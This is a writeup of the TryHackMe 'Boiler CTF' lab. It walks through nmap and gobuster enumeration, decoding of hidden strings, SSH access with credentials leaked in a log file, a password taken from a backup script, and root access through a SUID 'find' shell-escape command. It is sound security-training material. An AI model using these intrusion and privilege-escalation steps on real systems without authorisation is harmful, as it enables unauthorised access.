---
title: "Boiler CTF"
date: 2025-03-20
image: /assets/img/general/BoilerCTF/BoilerCTF_image.jpg
description: Writeup of the TryHackMe-CTF Boiler CTF
categories: [TryHackMe, Medium]
tags: [linux, sar2html, find, enumeration, web]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Boiler CTF</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Intermediate level CTF</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/boilerctf2">https://tryhackme.com/room/boilerctf2</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Boiler CTF.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.88.41
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 09:40 EDT
  Nmap scan report for 10.10.88.41
  Host is up (0.043s latency).
  Not shown: 65531 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  21/tcp    open  ftp
  80/tcp    open  http
  10000/tcp open  snet-sensor-mgmt
  55007/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,80,10000,55007 10.10.88.41
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 09:41 EDT
  Nmap scan report for 10.10.88.41
  Host is up (0.041s latency).

  PORT      STATE SERVICE VERSION
  21/tcp    open  ftp     vsftpd 3.0.3
  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | ftp-syst: 
  |   STAT: 
  | FTP server status:
  |      Connected to ::ffff:10.21.63.26
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 3
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
  55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
  |   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
  |_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 36.78 seconds
```
From here I proceeded the analysis port by port.

## Port 21 Analysis

I began with the FTP server because NMAP detected the use of the anonymous access:
```bash
$ ftp anonymous@10.10.88.41
  Connected to 10.10.88.41.
  220 (vsFTPd 3.0.3)
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> ls -al
  229 Entering Extended Passive Mode (|||40829|)
  150 Here comes the directory listing.
  drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
  drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
  -rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
  226 Directory send OK.
```

The contend of the `.info.txt` was ROT13 encrypted. While it wasn't useful, it was amusing:
```bash
kali@kali:~/ctf/boilerctf$ cat info.txt 
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

ROT13 decrypted: Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

## Port 10000 Analysis

The web server displayed a Webmin instance. I analyzed the source code and tried some default credentials, but I was locked out, ao I moved on to the next port:

![Brute Force Protection](/assets/img/tryhackme/BoilerCTF/thm_boilerctf_1.jpg)

## Port 80 Analysis

The web server displayed an Apache2 default page, so I initiated a Gobuster directory enumeration:
```bash
kali@kali:~/ctf/boilerctf$ gobuster dir --url http://10.10.88.41/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php 
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.88.41/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 291]
  /.php                 (Status: 403) [Size: 290]
  /.hta.txt             (Status: 403) [Size: 294]
  /.hta                 (Status: 403) [Size: 290]
  /.hta.php             (Status: 403) [Size: 294]
  /.hta.html            (Status: 403) [Size: 295]
  /.htaccess            (Status: 403) [Size: 295]
  /.htpasswd            (Status: 403) [Size: 295]
  /.htaccess.txt        (Status: 403) [Size: 299]
  /.htpasswd.php        (Status: 403) [Size: 299]
  /.htpasswd.txt        (Status: 403) [Size: 299]
  /.htaccess.php        (Status: 403) [Size: 299]
  /.htpasswd.html       (Status: 403) [Size: 300]
  /.htaccess.html       (Status: 403) [Size: 300]
  /index.html           (Status: 200) [Size: 11321]
  /index.html           (Status: 200) [Size: 11321]
  /joomla               (Status: 301) [Size: 311] [--> http://10.10.88.41/joomla/]
  /manual               (Status: 301) [Size: 311] [--> http://10.10.88.41/manual/]
  /robots.txt           (Status: 200) [Size: 257]
  /robots.txt           (Status: 200) [Size: 257]
  /server-status        (Status: 403) [Size: 299]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

### File /robots.txt Analysis

The `robots.txt` had interesting entries:
```html
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 [removed] 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

This seemed to be encoded, so I used CyberChef and was able to decode it:

![CyberChef](/assets/img/tryhackme/BoilerCTF/thm_boilerctf_2.jpg)

The decoded string appeared to be a hashed password which successfully cracked using Crackstation:

![Crackstation](/assets/img/tryhackme/BoilerCTF/thm_boilerctf_3.jpg)

didn't have anything to use the password for, so I noted it down and moved on.

### Directory /joomla Analysis

Gobuster discoverd a Joomla CMS instance, so I restarted the directory enumeration within the Joomla path:
```bash
kali@kali:~/ctf/boilerctf$ gobuster dir --url http://10.10.88.41/joomla --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.88.41/joomla
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 298]
  /.php                 (Status: 403) [Size: 297]
  /.hta.txt             (Status: 403) [Size: 301]
  /.hta                 (Status: 403) [Size: 297]
  /.htaccess.html       (Status: 403) [Size: 307]
  /.hta.php             (Status: 403) [Size: 301]
  /.hta.html            (Status: 403) [Size: 302]
  /.htaccess.txt        (Status: 403) [Size: 306]
  /.htaccess            (Status: 403) [Size: 302]
  /.htaccess.php        (Status: 403) [Size: 306]
  /.htpasswd            (Status: 403) [Size: 302]
  /.htpasswd.html       (Status: 403) [Size: 307]
  /.htpasswd.txt        (Status: 403) [Size: 306]
  /.htpasswd.php        (Status: 403) [Size: 306]
  /_archive             (Status: 301) [Size: 320] [--> http://10.10.88.41/joomla/_archive/]
  /_database            (Status: 301) [Size: 321] [--> http://10.10.88.41/joomla/_database/]
  /_files               (Status: 301) [Size: 318] [--> http://10.10.88.41/joomla/_files/]
  /_test                (Status: 301) [Size: 317] [--> http://10.10.88.41/joomla/_test/]
  /~www                 (Status: 301) [Size: 316] [--> http://10.10.88.41/joomla/~www/]
  /administrator        (Status: 301) [Size: 325] [--> http://10.10.88.41/joomla/administrator/]
  /bin                  (Status: 301) [Size: 315] [--> http://10.10.88.41/joomla/bin/]
  /build                (Status: 301) [Size: 317] [--> http://10.10.88.41/joomla/build/]
  /cache                (Status: 301) [Size: 317] [--> http://10.10.88.41/joomla/cache/]
  /components           (Status: 301) [Size: 322] [--> http://10.10.88.41/joomla/components/]
  /configuration.php    (Status: 200) [Size: 0]
  /images               (Status: 301) [Size: 318] [--> http://10.10.88.41/joomla/images/]
  /includes             (Status: 301) [Size: 320] [--> http://10.10.88.41/joomla/includes/]
  /index.php            (Status: 200) [Size: 12476]
  /index.php            (Status: 200) [Size: 12476]
  /installation         (Status: 301) [Size: 324] [--> http://10.10.88.41/joomla/installation/]
  /language             (Status: 301) [Size: 320] [--> http://10.10.88.41/joomla/language/]
  /layouts              (Status: 301) [Size: 319] [--> http://10.10.88.41/joomla/layouts/]
  /libraries            (Status: 301) [Size: 321] [--> http://10.10.88.41/joomla/libraries/]
  /LICENSE.txt          (Status: 200) [Size: 18092]
  /media                (Status: 301) [Size: 317] [--> http://10.10.88.41/joomla/media/]
  /modules              (Status: 301) [Size: 319] [--> http://10.10.88.41/joomla/modules/]
  /plugins              (Status: 301) [Size: 319] [--> http://10.10.88.41/joomla/plugins/]
  /README.txt           (Status: 200) [Size: 4793]
  /templates            (Status: 301) [Size: 321] [--> http://10.10.88.41/joomla/templates/]
  /tests                (Status: 301) [Size: 317] [--> http://10.10.88.41/joomla/tests/]
  /tmp                  (Status: 301) [Size: 315] [--> http://10.10.88.41/joomla/tmp/]
  /web.config.txt       (Status: 200) [Size: 1859]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

### Directory /_database Analysis

The directory displayed a string in red, which I was able to decode using ROT92:
```text
Lwuv oguukpi ctqwpf.

Just messing around,
```

### Directory /_files Analysis

The directory also displayed a red string that appeared to be encoded:
```bash
kali@kali:~/ctf/boilerctf$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d
  Whopsie daisy
```

### Directory /_test Analysis

The directory contained `sar2html`, a tool used to display performance data collected with the `sar` command. After researching this tool, I found an interesting entry in the <a href="https://www.exploit-db.com/exploits/47204">Exploit-DB</a>. 

![sar2html](/assets/img/tryhackme/BoilerCTF/thm_boilerctf_4.jpg)

To gather more insights, I initiated another directory enumeration, which gave me the following output:
```bash
kali@kali:~/ctf/boilerctf$ gobuster dir --url http://10.10.88.41/joomla/_test --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.88.41/joomla/_test
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 304]
  /.php                 (Status: 403) [Size: 303]
  /.hta.txt             (Status: 403) [Size: 307]
  /.hta                 (Status: 403) [Size: 303]
  /.hta.html            (Status: 403) [Size: 308]
  /.hta.php             (Status: 403) [Size: 307]
  /.htaccess            (Status: 403) [Size: 308]
  /.htaccess.txt        (Status: 403) [Size: 312]
  /.htaccess.html       (Status: 403) [Size: 313]
  /.htpasswd.php        (Status: 403) [Size: 312]
  /.htpasswd            (Status: 403) [Size: 308]
  /.htpasswd.txt        (Status: 403) [Size: 312]
  /.htpasswd.html       (Status: 403) [Size: 313]
  /.htaccess.php        (Status: 403) [Size: 312]
  /index.php            (Status: 200) [Size: 4802]
  /index.php            (Status: 200) [Size: 4802]
  /log.txt              (Status: 200) [Size: 716]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```
Before I continued with the Exploit-DB entry, I reviewed the enumeration output. My attention was drawn to a `log.txt` file that contained the following content:
```bash
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: [removed]
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

This appeared to be another set of credentials, which I used to successfully gain initial access via SSH: 
```bash
kali@kali:~/ctf/boilerctf$ ssh -p 55007 basterd@10.10.88.41

$ id
  uid=1001(basterd) gid=1001(basterd) groups=1001(basterd)
```

The shell environment was not very user-friendly, so I switched to Penelope.

## Privilege Escalation stoner

I continued by enumerating the user home directories and found a script called `/home/basterd/backup.sh`. Inside the script, the password for the user stoner was stored. With the credentials, I was able to switch to the user and retrieve the user flag. 
```bash
basterd@Vulnerable:~$ cat backup.sh
  [...]
  USER=stoner
  #s[removed]s
  [...]
basterd@Vulnerable:~$ su stoner 
  Password: 
stoner@Vulnerable:/home/basterd$ id
  uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
stoner@Vulnerable:~$ cat .secret 
  You [removed].
```

## Privilege Escalation root
I started with `sudo -l` and obtained the following output:
```bash
stoner@Vulnerable:/home$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

Next, I checked for SUID bits and found the following:
```bash
stoner@Vulnerable:/home$ find / -perm /4000 -type f 2>/dev/null
  [...]
  /usr/bin/find
  [...]
```

A quick search in <a href="https://gtfobins.github.io/gtfobins/find/#suid">GTFObins</a> provided everything I needed:
```bash
stoner@Vulnerable:/home$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
  root
# cd /root
# cat root.txt
  It [removed]?
```

solved! :)